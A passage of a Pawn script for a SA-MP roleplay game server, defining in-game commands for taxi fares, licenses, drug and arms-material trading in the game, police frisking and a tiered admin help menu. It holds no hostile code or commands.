                    TransportValue[playerid] = 0; TransportMoney[playerid] = 0;
                    return 1;
                }
                new Veh = GetPlayerVehicleID(playerid);
				if(IsAnTaxiCar(Veh))
                {
                    if(GetPlayerState(playerid) == 2)
                    {
                        tmp = strtok(cmdtext, idx);
                        if(!strlen(tmp))
                        {
                            SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fare [price]");
                            return 1;
                        }
                        moneys = strval(tmp);
                        if(moneys < 1 || moneys > 5) { SendClientMessage(playerid, COLOR_GREY, "   Fare price must be between $1 and $5 !"); return 1; }
                        TaxiDrivers += 1; TransportDuty[playerid] = 1; TransportValue[playerid] = moneys;
                        GetPlayerName(playerid,sendername,sizeof(sendername));
                        format(string, sizeof(string), "Taxi Driver %s is on duty, fare: $%d.", sendername, TransportValue[playerid]);
                        SendFamilyMessage(10, TEAM_DangerousTigers_COLOR, string);
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "** You are not the Driver !");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "You are not in a Taxi !");
                }
            }
            else
            {
                SendClientMessage(playerid,COLOR_GREY,"You are not a Taxi / Bus Driver !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd,"/licenses",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            new text1[128],text2[128],text3[128],text4[128],text5[20],text6[20];
            if(PlayerInfo[playerid][pCarLic] && PlayerInfo[playerid][pCarLicS] == 0)
            {
                text1 = "Passed";
            }
            else if(PlayerInfo[playerid][pCarLicS] > 0)
            {
				format(text1,sizeof(text1),"Toghif Shode (%d Saat)",PlayerInfo[playerid][pCarLicS]);
            }
            else if(PINFO[playerid][pCarLic] == 0 && PINFO[playerid][pCarLicS] == 0)
            {
                text1 = "Not Passed";
            }
            if(PlayerInfo[playerid][pFlyLic] && PlayerInfo[playerid][pFlyLicS] == 0)
            {
                text4 = "Passed";
            }
            else if(PlayerInfo[playerid][pFlyLicS] > 0)
            {
				format(text4,sizeof(text4),"Toghif Shode (%d Saat)",PlayerInfo[playerid][pFlyLicS]);
            }
            else if(PINFO[playerid][pFlyLic] == 0 && PINFO[playerid][pFlyLicS] == 0)
            {
                text4 = "Not Passed";
            }
            if(PlayerInfo[playerid][pBoatLic] && PlayerInfo[playerid][pBoatLicS] == 0)
            {
                text2 = "Passed";
            }
            else if(PlayerInfo[playerid][pBoatLicS] > 0)
            {
				format(text2,sizeof(text2),"Toghif Shode (%d Saat)",PlayerInfo[playerid][pBoatLicS]);
            }
            else if(PINFO[playerid][pBoatLic] == 0 && PINFO[playerid][pBoatLicS] == 0)
            {
                text2 = "Not Passed";
            }
            if(PlayerInfo[playerid][pGunLic] && PlayerInfo[playerid][pGunLicS] == 0)
            {
                text5 = "Passed";
            }
            else if(PlayerInfo[playerid][pGunLicS] > 0)
            {
				format(text5,sizeof(text5),"Toghif Shode (%d Saat)",PlayerInfo[playerid][pGunLicS]);
            }
            else if(PINFO[playerid][pGunLic] == 0 && PINFO[playerid][pGunLicS] == 0)
            {
                text5 = "Not Passed";
            }
            if(PlayerInfo[playerid][pMatsLic] && PlayerInfo[playerid][pMatsLicS] == 0)
            {
                text6 = "Passed";
            }
            else if(PlayerInfo[playerid][pMatsLicS] > 0)
            {
				format(text6,sizeof(text6),"Toghif Shode (%d Saat)",PlayerInfo[playerid][pMatsLicS]);
            }
            else if(PINFO[playerid][pMatsLic] == 0 && PINFO[playerid][pMatsLicS] == 0)
            {
                text6 = "Not Passed";
            }
            if(PlayerInfo[playerid][pFishLic]) { text3 = "Passed"; } else { text3 = "Not Passed"; }
            SendClientMessage(playerid, CRISTIAN, "|__________________ Licenses __________________|");
            if(PINFO[playerid][pCarLic])
            {
            format(string, sizeof(string), "** Drivers License: %s(%d).", text1,PINFO[playerid][pCarLic]);
            }
            else
            {
            format(string, sizeof(string), "** Drivers License: %s.", text1);
            }
            SendClientMessage(playerid, COLOR_CRS2, string);
            if(PINFO[playerid][pFlyLic])
            {
            format(string, sizeof(string), "** Flying License: %s(%d).", text4,PINFO[playerid][pFlyLic]);
            }
            else
            {
            format(string, sizeof(string), "** Flying License: %s.", text4);
            }
            SendClientMessage(playerid, COLOR_CRS2, string);
            if(PINFO[playerid][pBoatLic])
            {
            format(string, sizeof(string), "** Sailing License: %s(%d).", text2,PINFO[playerid][pBoatLic]);
            }
            else
            {
            format(string, sizeof(string), "** Sailing License: %s.", text2);
            }
            SendClientMessage(playerid, COLOR_CRS3, string);
            if(PINFO[playerid][pFishLic])
            {
            format(string, sizeof(string), "** Fishing License: %s(%d).", text3,PINFO[playerid][pFishLic]);
            }
            else
            {
            format(string, sizeof(string), "** Fishing License: %s.", text3);
            }
            SendClientMessage(playerid, COLOR_CRS3, string);
            if(PINFO[playerid][pGunLic])
            {
            format(string, sizeof(string), "** Weapon License: %s(%d).", text5,PINFO[playerid][pGunLic]);
            }
            else
            {
            format(string, sizeof(string), "** Weapon License: %s.", text5);
            }
            SendClientMessage(playerid, COLOR_CRS4, string);
            if(PINFO[playerid][pMatsLic])
            {
            format(string, sizeof(string), "** Materials License: %s(%d).", text6,PINFO[playerid][pMatsLic]);
            }
            else
            {
            format(string, sizeof(string), "** Materials License: %s.", text6);
            }
            SendClientMessage(playerid, COLOR_CRS4, string);
            SendClientMessage(playerid, CRISTIAN, "|______________________________________________|");
        }
        return 1;
    }
    if(strcmp(cmd,"/showlicenses",true)==0 || strcmp(cmd,"/sl",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /showlicenses [playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Show Licenses to yourself, use /licenses!"); return 1; }
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
						new text1[128],text2[128],text3[128],text4[128],text5[128],text6[128],string1[256],string2[256],string3[256],maxstr[256];
                        if(PlayerInfo[playerid][pCarLic] && PINFO[playerid][pCarLicS] == 0) { text1 = "Passed"; } else if(PINFO[playerid][pCarLicS] > 0) { format(text1,64,"Toghif Shode (%d Saat)",PlayerInfo[playerid][pCarLicS]); } else if(PINFO[playerid][pCarLic] == 0 && PINFO[playerid][pCarLicS] == 0) { text1 = "Not Passed"; }
                        if(PlayerInfo[playerid][pFlyLic] && PINFO[playerid][pFlyLicS] == 0) { text4 = "Passed"; } else if(PINFO[playerid][pFlyLicS] > 0) { format(text4,64,"Toghif Shode (%d Saat)",PlayerInfo[playerid][pFlyLicS]); } else if(PINFO[playerid][pFlyLic] == 0 && PINFO[playerid][pFlyLicS] == 0) { text4 = "Not Passed"; }
                        if(PlayerInfo[playerid][pBoatLic] && PINFO[playerid][pBoatLicS] == 0) { text2 = "Passed"; } else if(PINFO[playerid][pBoatLicS] > 0) { format(text2,64,"Toghif Shode (%d Saat)",PlayerInfo[playerid][pBoatLicS]); } else if(PINFO[playerid][pBoatLic] == 0 && PINFO[playerid][pBoatLicS] == 0) { text2 = "Not Passed"; }
                        if(PlayerInfo[playerid][pFishLic]) { text3 = "Passed"; } else { text3 = "Not Passed"; }
                        if(PlayerInfo[playerid][pGunLic] && PINFO[playerid][pGunLicS] == 0) { text5 = "Passed"; } else if(PINFO[playerid][pGunLicS] > 0) { format(text5,64,"Toghif Shode (%d Saat)",PlayerInfo[playerid][pGunLicS]); } else if(PINFO[playerid][pGunLic] == 0 && PINFO[playerid][pGunLicS] == 0) { text5 = "Not Passed"; }
                        if(PlayerInfo[playerid][pMatsLic] && PINFO[playerid][pMatsLicS] == 0) { text6 = "Passed"; } else if(PINFO[playerid][pMatsLicS] > 0) { format(text6,64,"Toghif Shode (%d Saat)",PlayerInfo[playerid][pMatsLicS]); } else if(PINFO[playerid][pMatsLic] == 0 && PINFO[playerid][pMatsLicS] == 0) { text6 = "Not Passed"; }
                        format(string, sizeof(string), "|__________ Licenses of %s __________|", sendername);
                        SendClientMessage(giveplayerid, CRISTIAN, string);
                        if(PINFO[playerid][pCarLic])
                        {
                        format(string, sizeof(string), "** Drivers License: %s(%d).", text1,PINFO[playerid][pCarLic]);
                        }
                        else
                        {
                        format(string, sizeof(string), "** Drivers License: %s.", text1);
                        }
                        SendClientMessage(giveplayerid, COLOR_GRAD6, string);
                        if(PINFO[playerid][pFlyLic])
                        {
                        format(string, sizeof(string), "** Flying License: %s(%d).", text4,PINFO[playerid][pFlyLic]);
                        }
                        else
                        {
                        format(string, sizeof(string), "** Flying License: %s.", text4);
                        }
                        SendClientMessage(giveplayerid, COLOR_GRAD5, string);
                        if(PINFO[playerid][pBoatLic])
                        {
                        format(string, sizeof(string), "** Sailing License: %s(%d).", text2,PINFO[playerid][pBoatLic]);
                        }
                        else
                        {
                        format(string, sizeof(string), "** Sailing License: %s.", text2);
                        }
                        SendClientMessage(giveplayerid, COLOR_GRAD4, string);
                        if(PINFO[playerid][pFishLic])
                        {
                        format(string, sizeof(string), "** Fishing License: %s(%d).", text3,PINFO[playerid][pFishLic]);
                        }
                        else
                        {
                        format(string, sizeof(string), "** Fishing License: %s.", text3);
                        }
                        SendClientMessage(giveplayerid, COLOR_GRAD3, string);
                        if(PINFO[playerid][pGunLic])
                        {
                        format(string, sizeof(string), "** Weapon License: %s(%d).", text5,PINFO[playerid][pGunLic]);
                        }
                        else
                        {
                        format(string, sizeof(string), "** Weapon License: %s.", text5);
                        }
                        SendClientMessage(giveplayerid, COLOR_GRAD2, string);
                        if(PINFO[playerid][pMatsLic])
                        {
                        format(string, sizeof(string), "** Materials License: %s(%d).", text6,PINFO[playerid][pMatsLic]);
                        }
                        else
                        {
                        format(string, sizeof(string), "** Materials License: %s.", text6);
                        }
                        SendClientMessage(giveplayerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "* %s has shown his Licenses to you.", sendername);
                        SendClientMessage(giveplayerid, COLOR_YELLOW, string);
                        format(string, sizeof(string), "* You have shown your Licenses to %s.", giveplayer);
                        SendClientMessage(playerid, COLOR_YELLOW, string);
                        format(string1, 1024, "{26B0BA}|________Licenses of %s________|", sendername);
                        format(string2, 1024, "{E5E3B3}Drivers License: {26B0BA}%s \n{E5E3B3}Flying License: {26B0BA}%s \n{E5E3B3}Sailing License: {26B0BA}%s \n{E5E3B3}Fishing License: {26B0BA}%s",text1, text4, text2, text3);
                        format(string3, 1024, "{E5E3B3}Weapon License: {26B0BA}%s \n____________________________________",text5);
                        format(maxstr, 2000, "%s\n%s\n%s",string1,string2,string3);
                        ShowPlayerDialog(playerid, 428, DIALOG_STYLE_MSGBOX, "", maxstr, "Cancel","");
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/buydrugs", true) == 0)
    {
      if(IsPlayerConnected(playerid))
      {
      new strinng[256];
      new strings[128];
        if(!PlayerToPoint(100.0,playerid,323.507873,1117.880981,1083.882812)) return SCM(playerid,COLOR_LIGHTRED,"you are not in Crack house.");
        if(PlayerInfo[playerid][pJob] == 4)
        {
        new amount;
        tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) { SCM(playerid,COLOR_WHITE,"USAGE: /buydrugs [amount]"); return 1; }
            amount = strval(tmp);
            new drugskill = PlayerInfo[playerid][pDrugsSkill];
            if(drugskill < 50) { if(amount > 5-PINFO[playerid][pDrugs] || amount < 0 || PlayerInfo[playerid][pDrugs] >= 5) { SCM(playerid, COLOR_WHITE, "maximum amount for this skill level is 5/Invalid amount/you have more than 5 drugs"); return 1; }}
            if(drugskill >= 50 && drugskill < 100) { if(amount > 10-PINFO[playerid][pDrugs] || amount < 0 || PlayerInfo[playerid][pDrugs] >= 10) { SCM(playerid, COLOR_WHITE, "maximum amount for this skill level is 10 / Invalid amount/you have more than 10 drugs"); return 1; }}
            if(drugskill >= 100 && drugskill < 200) { if(amount > 15-PINFO[playerid][pDrugs] || amount < 0 || PlayerInfo[playerid][pDrugs] >= 15) { SCM(playerid, COLOR_WHITE, "maximum amount for this skill level is 15 / Invalid amount/you have more than 15 drugs"); return 1; }}
            if(drugskill >= 200 && drugskill < 400) { if(amount > 20-PINFO[playerid][pDrugs] || amount < 0 || PlayerInfo[playerid][pDrugs] >= 20) { SCM(playerid, COLOR_WHITE, "maximum amount for this skill level is 20 / Invalid amount/you have more than 20 drugs"); return 1; }}
            if(drugskill >= 400) { if(amount > 30-PINFO[playerid][pDrugs] || amount < 0 || PlayerInfo[playerid][pDrugs] >= 30) { SCM(playerid, COLOR_WHITE, "maximum amount for this skill level is 30 / Invalid amount/you have more than 30 drugs"); return 1; }}
        PlayerInfo[playerid][pDrugs] += amount;
        SaveKonVal(playerid, "pDrugs", PINFO[playerid][pDrugs]);
        new price = amount * 1;
        GivePlayerPool(playerid, -price);
        format(strinng, sizeof(strinng), "You bought {FFFFFF}%d {FF6347}grams of Drug for {FFFFFF}$%s {FF6347}Cash", amount, FormatNumber(price));
        SCM(playerid,COLOR_LIGHTRED,strinng);
        format(strings, sizeof(strings), "~r~-$%d",price);
        GameTextForPlayer(playerid, strings, 5000, 1);
        PlayerPlaySound(playerid,1084,0.0,0.0,0.0);
        return 1;
        }
        else
        {
        SCM(playerid,COLOR_LIGHTRED,"you are not a Drugs dealer.");
        return 1;
        }
      }
    }
    if(strcmp(cmd,"/frisk",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(!IsACop(playerid)) return SCM(playerid,COLOR_BLUE,"You are not a Cop.");
        if(OnDuty[playerid] != 1)
            {
                SendClientMessage(playerid, COLOR_BLUE, "You are not on-Duty.");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /frisk [playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Frisk yourself!"); return 1; }
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        new text1[20], text2[20], text6[20];
                        if(PlayerInfo[giveplayerid][pDrugs] > 0) { text1 = "He has."; } else { text1 = "He hasen't."; }
                        if(PlayerInfo[giveplayerid][pMats] > 0) { text2 = "He has."; } else { text2 = "He hasen't."; }
                        new sweapon, sammo;
                        text6 = "He hasen't.";
                        for (new i=0; i<9; i++)
                        {
                            GetPlayerWeaponData(giveplayerid, i, sweapon, sammo);
                            if(sweapon != 0 && sammo != 0)
                            {
                                text6 = "He has.";
                            }
                        }
                        format(string, sizeof(string), "|__________ Items with %s __________|", giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "Drugs: %s.", text1);
                        SendClientMessage(playerid, COLOR_GREY, string);
                        format(string, sizeof(string), "Materials: %s.", text2);
                        SendClientMessage(playerid, COLOR_GREY, string);
                        format(string, sizeof(string), "Weapons: %s.", text6);
                        SendClientMessage(playerid, COLOR_GREY, string);
                        if(PlayerInfo[giveplayerid][pSex] == 1) { format(string, sizeof(string), "%s taps %s all over his body and searches for some items.", sendername ,giveplayer); }
                        else { format(string, sizeof(string), "%s taps %s all over her body and searches for some items.", sendername ,giveplayer); }
                        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is not near you");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "That player is Offline");
                return 1;
            }
        }
        return 1;
    }
//---------------------------------------------------------------------------------------
    if(strcmp(cmd,"/ah",true)==0) {
        if(IsPlayerConnected(playerid)) {
            if (PlayerInfo[playerid][pAdmin] >= 1) {
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SCM(playerid, CRISTIAN, "___________________________________________");
                    SCM(playerid, COLOR_WHITE, "USAGE: /ah [AdminLevel (1-7)]");
                    return 1; }
                if(strcmp(x_nr,"1",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 1) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2, "*** Admin Level 1  ***  /specoff /cc /areport /creport /reports /ac /ae /specplayer /fly /drag");
                        SCM(playerid, COLOR_GRAD2, "*** Admin Level 1  ***  /vehid /check /ajail /setint /setvw /setmypos /stt /goto /gotolist");
                        SCM(playerid, COLOR_GRAD2, "*** Admin Level 1  ***  /slap /mute /kk /warn /ban /unfreeze /respawn");}  }
                else if(strcmp(x_nr,"2",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 2) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 2  *** /freezall /unfreezeall /checkweapons /o(oc) /skydive"); }  }
                else if(strcmp(x_nr,"3",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 3) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 3  *** /stopevent /dv /rtc /respawncar /fixveh /sbiz /agl ");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 3  *** /setjob /mark /gotomark /tp /gg /freeze /ram");}  }
                else if(strcmp(x_nr,"4",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 4) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 4  *** /lockengine /unlockengine /amodveh/vehcolor /gotopveh /nitro /vehslap ");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 4  *** /superslap /entercar /getcar /sethp/setarmor /jetpack /jetpackto /rjetpack /rpfv");}  }
                else if(strcmp(x_nr,"5",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 5) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 5 *** /sethpall /setarmorall /racd /afill /dva /unjail /getip /afcheck /clearwanted");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 5 *** /cnn /tod /setskin /fuelcars /veh/weather /weatherall /getmoney /unwarn /intx /ints"); }  }
                else if(strcmp(x_nr,"6",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 6) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 6 ***  /rac /qool /qoolto /asellcar /house /biz /edit ");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 6 ***  /fourdive /ffnn /mc /gotocar /takegunall /ggall /rav"); }  }
                else if(strcmp(x_nr,"7",true) == 0) {
                    if (PlayerInfo[playerid][pAdmin] >= 7) {
                        SCM(playerid, CRISTIAN,"_______________________________________");
                        SCM(playerid, COLOR_WHITE,"*** ADMIN HELP *** type a command for more help");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /respectall /moneyall /levelall ");
                        SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /changenick /gotohint /agivemats /agivedr /movehouse /exph /movebiz /movesbiz /saveaccounts /anw");
						SCM(playerid, COLOR_GRAD2,"*** Admin Level 7 ***  /asellbiz /asellsbiz /asellhouse /bigears /sn /makehelper /makeleader /setmoney /givemoney /payday ");}  }
                else
                SCM(playerid, COLOR_CRS3, "** Invalid number.");
                return 1; }
            else
            SCM(playerid, COLOR_CRS3, "** You are not admin.");
            return 1; }
        return 1; }
//--------f----------------------------------------------------------------------
	if(strcmp(cmd,"/rep",true)==0)
	{
	    new title[128];
   	    format(title,sizeof(title),"{57e547}JoKeR GaminG {FFFFFF} Server Rep Point Shop - %d Rep Point",PlayerInfo[playerid][pRep]);
		ShowPlayerDialog(playerid,092178, DIALOG_STYLE_LIST,title, "Chainsaw=10rep\nMinigun = 100rep\nShotgun = 25rep\nswanoffshotgun = 20rep\nCountry Rifle =22rep\nJetPack = 58rp\nSniper rifle = 35rp\nInfeRnus = 35 rp\nHs Rocket = 80 rp\nCamera = 10 rp", "Begir", "");
		return 1;
	}







		if(strcmp(cmd, "/sellmaterials", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(PlayerInfo[playerid][pJob] != 9)
				{
					SendMessage(playerid, COLOR_LIGHTBLUE, "You are not a arms dealer.");
					return 1;
				}
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COLOR_GRAD2, "USPGE: /sellmaterials [playerid/PartOfName] [ammount] [price]");
					return 1;
				}
				new playa;
				new money;
				new needed;
				playa = ReturnUser(tmp);
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp)) { SendMessage(playerid, COLOR_GRAD2, "USPGE: /sellmaterials [playerid/PartOfName] [ammount] [price]"); return 1; }
				needed = strval(tmp);
				if(needed < 1) { SendMessage(playerid, COLOR_GREY, "Invalid amount!"); return 1; }
				tmp = strtok(cmdtext, idx);
				if(!strlen(tmp)) { SendMessage(playerid, COLOR_GRAD2, "USPGE: /sellmaterials [playerid/PartOfName] [ammount] [price]"); return 1; }
				money = strval(tmp);
				if(money < 1) { SendMessage(playerid, COLOR_GREY, "Price not lower then $1!"); return 1; }
				if(needed > PlayerInfo[playerid][pMats]) { SendMessage(playerid, COLOR_GREY, "You dont have that much Materials with you !"); return 1; }
				if(IsPlayerConnected(playa))
				{
					if(playa != INVALID_PLAYER_ID)
					{
						if (ProxDetectorS(8.0, playerid, playa))
						{
							if(playa == playerid)
							{
								SendMessage(playerid, COLOR_GREY, "Cant sell to yourself!");
								return 1;
							}
							if(MatxOffer[playa] == playerid) { SCM(playerid,COLOR_BLUE, " You already offerd to this player!!"); return 1; }
							GetPlayerName(playa, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							format(string, sizeof(string), "You offerd %s to buy %d materials for $%d.", giveplayer, needed, money);
							SendMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "Arms Dealer %s wants to sell you %d materials for $%d, (type /accept materials %i) to buy.", sendername, needed, money, playerid);
							SendMessage(playa, COLOR_LIGHTBLUE, string);
							MatxOffer[playa] = playerid;
							MatxPrice[playa] = money;
							MatxGram[playa] = needed;
							MatxSell[playerid] = playa;
						}
						else
						{
							SendMessage(playerid, COLOR_GREY, "That player is not near you !");
						}
					}
				}
				else
				{
					SendMessage(playerid, COLOR_GREY, "That player is offline.");
				}
			}
			return 1;
		}






    if(strcmp(cmd,"/materials",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pJob] != 9)
            {
                SendClientMessage(playerid,COLOR_GREY,"** You are not a Arms Dealer.");
                return 1;
            }
            if ( PlayerInfo[playerid][pMatsLic] == 0)
            {
                SCM(playerid, COLOR_LIGHTBLUE, "You haven't a Material License.");
                return 1;
            }
            new x_nr[256];
            x_nr = strtok(cmdtext, idx);
            if(!strlen(x_nr)) {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /materials [name]");
                SendClientMessage(playerid, COLOR_CRS3, "Available names: Get, Deliver.");
                return 1;
            }
            if(strcmp(x_nr,"get",true) == 0)
            {
                if(PlayerToPoint(3.0,playerid,2770.6973,-1628.4293,12.1775))
                {
                new level = PlayerInfo[playerid][pMatsSkill];
                    if(MatsHolding[playerid] >= 10 && level < 50)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't hold any more Materials Packages.");
                        return 1;
                    }
                    else if(MatsHolding[playerid] >= 20 && level < 99 && level >= 50)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't hold any more Materials Packages.");
                        return 1;
                    }
                    else if(MatsHolding[playerid] >= 30 && level < 199 && level >= 100)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't hold any more Materials Packages.");
                        return 1;
                    }
                    else if(MatsHolding[playerid] >= 40 && level < 299 && level >= 200)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't hold any more Materials Packages.");
                        return 1;
                    }
                    else if(MatsHolding[playerid] >= 50 && level >= 300)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You can't hold any more Materials Packages.");
                        return 1;
                    }
                    if(GetPlayerPool(playerid) < 10)
                    {
                    SCM(playerid,COLOR_LIGHTRED,"You haven't 10$.");
                    return 1;
                    }
                    if(PlayerInfo[playerid][pMatsSkill] < 50)
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You bought 10 Materials Packages for $10.");
                        GivePlayerPool(playerid, -10);
                        MatsHolding[playerid] = 10;
                    }
                    else if(level >= 50 && level < 100)
                    {
                    SCM(playerid,COLOR_LIGHTBLUE,"You bought 20 Materials Packages for $20.");
                    GivePlayerPool(playerid, -20);
                    MatsHolding[playerid] = 20;
                    }
                    else if(level >= 100 && level < 200)
                    {
                    SCM(playerid,COLOR_LIGHTBLUE,"You bought 30 Materials Packages for $25.");
                    GivePlayerPool(playerid, -25);
                    MatsHolding[playerid] = 60;
                    }
                    else if(level >= 200 && level < 300)
                    {
                    SCM(playerid,COLOR_LIGHTBLUE,"You bought 40 Materials Packages for $35.");
                    GivePlayerPool(playerid, -35);
                    MatsHolding[playerid] = 80;
                    }
                    else if(level >= 300)
                    {
                    SCM(playerid,COLOR_LIGHTBLUE,"You bought 50 Materials Packages for $24.");
                    GivePlayerPool(playerid, -24);
                    MatsHolding[playerid] = 100;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_ALI, "You are not at the Materials Package Building in Los Santos.");
                    return 1;
                }
            }
            else if(strcmp(x_nr,"deliver",true) == 0)
            {
                if(PlayerToPoint(3.0,playerid,1712.9865,913.2946,10.8203))
                {
                    if(MatsHolding[playerid] > 0)
                    {
                        new payout = (50)*(MatsHolding[playerid]);
                        format(string, sizeof(string), "The Factory Gave You %d Materials from your %d Packages.", payout, MatsHolding[playerid]);
                        SendClientMessage(playerid, COLOR_ALI, string);
                        PlayerInfo[playerid][pMats] += payout;
                        SaveKonVal(playerid, "pMats", PINFO[playerid][pMats]);
                        if(PINFO[playerid][pMatsSkill] < 301) {PlayerInfo[playerid][pMatsSkill] ++; SaveKonVal(playerid, "pMatsSkill", PINFO[playerid][pMatsSkill]);}
                        MatsHolding[playerid] = 0;
                        if(PlayerInfo[playerid][pMatsSkill] == 50)
                        { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill is now Level 2, you can now deliver for more packages."); }
                        else if(PlayerInfo[playerid][pMatsSkill] == 100)
                        { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill is now Level 3, you can now deliver for more packages with lower price."); }
                        else if(PlayerInfo[playerid][pMatsSkill] == 200)
                        { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill is now Level 4, you can now deliver for more packages with lower price."); }
                        else if(PlayerInfo[playerid][pMatsSkill] == 300)
                        { SendClientMessage(playerid, COLOR_YELLOW, "Your Arms Dealer Skill is now Level 5, you can now deliver for more packages with lower price."); }

                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, "You haven't any Materials Packages.");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_ALI, "You are not at the Willowfield Gun Factory.");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_ALI, "Invalid action name");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd,"/war",true)==0)
    {
		if(PlayerInfo[playerid][pAdmin] >= 6)
		{
			if(ServerTurf != 9999)
			{
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"/Attack = Active");
				ServerWar = 9999;
				format(string,sizeof(string),"Admin %s(%d) Active /Attack",PlayerName(playerid),playerid);
				AdminWarn(string);
			}
			if(ServerWar == 9999)
			{
				SendClientMessage(playerid,COLOR_LIGHTBLUE,"/Attack = Deactive");
				ServerWar = 0;
				format(string,sizeof(string),"Admin %s(%d) Deactive /Attack",PlayerName(playerid),playerid);
				AdminWarn(string);
			}
		}
		else return SendClientMessage(playerid,COLOR_LIGHTBLUE,"Your Admin Level Isn't Enough! (+6)");
		return 1;
	}
    if(strcmp(cmd,"/nofind",true)==0)
    {
		if(PlayerInfo[playerid][pAdmin] <= 5) return SendClientMessage(playerid,COLOR_LIGHTBLUE,"Your Admin Level Isn't Enough! (+6)");
		if(pNoFind[playerid] == 0)
		{
			SendClientMessage(playerid,COLOR_LIGHTBLUE,"You Are Now Unknown To Detectives!");
			pNoFind[playerid] = 1;
			return 1;
		}
		if(pNoFind[playerid] == 1)
		{
